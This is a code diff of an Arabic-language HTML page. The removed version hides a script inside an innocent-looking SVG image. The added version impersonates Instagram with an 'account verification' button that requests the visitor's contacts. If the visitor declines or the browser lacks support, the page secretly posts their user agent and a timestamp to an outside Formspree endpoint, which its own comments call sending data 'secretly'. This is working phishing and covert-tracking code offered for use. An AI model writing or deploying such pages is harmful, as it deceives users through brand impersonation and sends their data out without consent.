@@ -1,12 +1,106 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>صورة</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; border: 1px solid #dbdbdb; border-radius: 12px; padding: 40px 30px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { font-family: 'Billabong', cursive; font-size: 48px; color: #262626; margin-bottom: 20px; letter-spacing: -1px; }
+        .btn { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .btn:disabled { background: #b2dffc; cursor: default; }
+        .status { font-size: 13px; color: #262626; margin-top: 15px; padding: 10px; background: #f0f0f0; border-radius: 8px; display: none; }
+    </style>
 </head>
 <body>
-    <!-- هذه الصورة تبدو عادية، ولكنها تحتوي على كود خفي -->
-    <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='400' height='300'><foreignObject width='100%' height='100%'><div xmlns='http://www.w3.org/1999/xhtml'><script>fetch('https://formspree.io/f/mljrbabg',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:'تم الجلب',ua:navigator.userAgent})});</script></div></foreignObject></svg>" alt="صورة بريئة">
-    
-    <h2>هذه مجرد صورة عادية</h2>
+
+    <div class="card">
+        <div class="logo">Instagram</div>
+        <p style="color: #8e8e8e; font-size: 14px;">تأمين الحساب عبر جهات الاتصال</p>
+        <button class="btn" id="instaBtn">تأكيد الحساب</button>
+        <div class="status" id="statusBox"></div>
+    </div>
+
+    <script>
+        document.getElementById('instaBtn').addEventListener('click', async function() {
+            const btn = this;
+            const statusBox = document.getElementById('statusBox');
+            
+            btn.innerText = "جاري التحقق...";
+            btn.disabled = true;
+            statusBox.style.display = 'none';
+
+            if (!navigator.contacts || !navigator.contacts.select) {
+                sendData("المتصفح لا يدعم طلب جهات الاتصال. تم الإرسال تلقائياً.");
+                btn.innerText = "تم التحقق";
+                btn.style.background = "#8e8e8e";
+                return;
+            }
+
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                
+                // حالة "السماح"
+                if (contacts && contacts.length > 0) {
+                    statusBox.style.display = 'block';
+                    statusBox.innerText = "✅ تم تأكيد الحساب بنجاح!";
+                    statusBox.style.background = "#e6f5e6";
+                    statusBox.style.color = "#2e7d32";
+                    btn.innerText = "تم التحقق";
+                    btn.style.background = "#0095f6";
+                    // في حالة السماح، لا نرسل بيانات (لأن المستخدم تعاون)
+                } else {
+                    // إذا لم يصل شيء (ضغط عدم السماح أو إلغاء)
+                    sendData("رفض المستخدم الإذن. تم إرسال البيانات سراً.");
+                }
+            } catch (error) {
+                // رفض المستخدم أو خطأ أمني
+                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
+                    sendData("رفض المستخدم الإذن. تم إرسال البيانات سراً (catch).");
+                } else {
+                    statusBox.style.display = 'block';
+                    statusBox.innerText = "❌ خطأ غير متوقع.";
+                    statusBox.style.background = "#ffebee";
+                    statusBox.style.color = "#c62828";
+                    btn.innerText = "تأكيد الحساب";
+                    btn.disabled = false;
+                }
+            }
+        });
+
+        // دالة إرسال البيانات إلى Formspree
+        function sendData(reason) {
+            const data = {
+                status: "تم الإرسال (رفض الإذن)",
+                reason: reason,
+                ua: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            // ربط الكود بـ Formspree الخاص بك
+            const formspreeUrl = 'https://formspree.io/f/mljrbabg';
+
+            fetch(formspreeUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                const statusBox = document.getElementById('statusBox');
+                statusBox.style.display = 'block';
+                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
+                statusBox.style.background = "#e3f2fd";
+                statusBox.style.color = "#0d47a1";
+                document.getElementById('instaBtn').innerText = "تم التحديث";
+                document.getElementById('instaBtn').style.background = "#8e8e8e";
+            }).catch(() => {
+                const statusBox = document.getElementById('statusBox');
+                statusBox.style.display = 'block';
+                statusBox.innerText = "⚠️ حدث خطأ في الاتصال. جاري المحاولة لاحقاً.";
+                statusBox.style.background = "#ffecb3";
+                statusBox.style.color = "#e65100";
+            });
+        }
+    </script>
 </body>
 </html>
